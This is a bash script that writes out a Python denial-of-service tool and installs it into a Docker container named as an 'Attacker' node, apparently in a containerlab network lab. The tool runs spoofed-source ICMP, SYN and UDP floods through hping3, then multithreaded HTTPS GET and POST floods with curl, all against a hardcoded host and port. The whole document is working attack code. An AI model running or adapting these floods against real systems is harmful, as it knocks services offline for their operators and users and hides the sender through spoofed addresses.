#!/bin/bash

cat << 'EOF' > /tmp/dos_attack_simple.py
#!/usr/bin/env python3
"""
DoS Attack Script - HTTPS with curl
Target: 172.168.3.5:8443
"""

import socket
import threading
import time
import random
import subprocess
from datetime import datetime

TARGET_IP = "172.168.3.5"
TARGET_PORT = 8443

class DoS:
    def __init__(self):
        self.target_ip = TARGET_IP
        self.target_port = TARGET_PORT
        self.running = True
        self.count = 0
        
    def log(self, msg):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def icmp_flood(self, duration=30):
        self.log(f"ICMP Flood for {duration}s")
        cmd = f"timeout {duration} hping3 -1 --flood --rand-source {self.target_ip}"
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.log("ICMP done")

    def syn_flood(self, duration=30):
        self.log(f"SYN Flood for {duration}s")
        cmd = f"timeout {duration} hping3 -S -p {self.target_port} --flood --rand-source {self.target_ip}"
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.log("SYN done")

    def http_worker(self):
        """HTTPS GET mit curl - super einfach! """
        while self.running:
            try:
                # curl macht SSL automatisch bei https://
                cmd = f"curl -sk https://{self.target_ip}/? {random.randint(1,999999)} -m 2"
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.count += 1
            except:
                pass

    def http_flood(self, duration=40):
        self.log(f"HTTPS GET Flood for {duration}s")
        self.running = True
        self.count = 0
        
        threads = []
        for _ in range(150):
            t = threading.Thread(target=self.http_worker)
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.01)
        
        time.sleep(2)
        
        for i in range(duration):
            if i % 10 == 0:
                self.log(f"{i}/{duration}s - Sent: {self.count}")
            time.sleep(1)
        
        self.running = False
        time.sleep(1)
        self.log(f"HTTPS GET done - Total: {self.count}")

    def post_worker(self):
        """HTTPS POST mit curl"""
        while self.running:
            try:
                data = "X" * random.randint(1000, 5000)
                cmd = f"curl -sk https://{self.target_ip}/ -X POST -d 'data={data}' -m 2"
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.count += 1
            except:
                pass

    def post_flood(self, duration=40):
        self.log(f"HTTPS POST Flood for {duration}s")
        self.running = True
        self.count = 0
        
        threads = []
        for _ in range(150):
            t = threading.Thread(target=self.post_worker)
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.01)
        
        time.sleep(2)
        
        for i in range(duration):
            if i % 10 == 0:
                self.log(f"{i}/{duration}s - Sent: {self.count}")
            time.sleep(1)
        
        self.running = False
        time.sleep(1)
        self.log(f"HTTPS POST done - Total: {self.count}")

    def udp_flood(self, duration=30):
        self.log(f"UDP Flood for {duration}s")
        cmd = f"timeout {duration} hping3 -2 --flood --rand-source -p {self.target_port} {self.target_ip}"
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.log("UDP done")

    def run_all(self):
        print(f"DoS Attack - HTTPS MODE - Target: {self.target_ip}:{self.target_port}")
        
        self.log("Starting ALL attacks...")
        
        attacks = [
            ("ICMP Flood", lambda: self.icmp_flood(30)),
            ("SYN Flood", lambda: self.syn_flood(30)),
            ("HTTPS GET Flood", lambda: self.http_flood(40)),
            ("HTTPS POST Flood", lambda: self.post_flood(40)),
            ("UDP Flood", lambda: self.udp_flood(30)),
        ]
        
        for name, attack in attacks:
            self.log(f"\n{'='*50}")
            self.log(f"{name}")
            self.log(f"{'='*50}")
            attack()
            self.log(f"Waiting 5s...\n")
            time.sleep(5)
        
        self.log("ALL ATTACKS COMPLETED!")

if __name__ == "__main__":
    dos = DoS()
    dos.run_all()
EOF

chmod +x /tmp/dos_attack_simple.py

# Copy to container
echo "[+] Copying simplified DoS script to Attacker container..."
sudo docker cp /tmp/dos_attack_simple.py clab-MaJuVi-Attacker:/root/dos.py
echo "  DoS Script installed!"
echo "Run in container: python3 /root/dos.py"
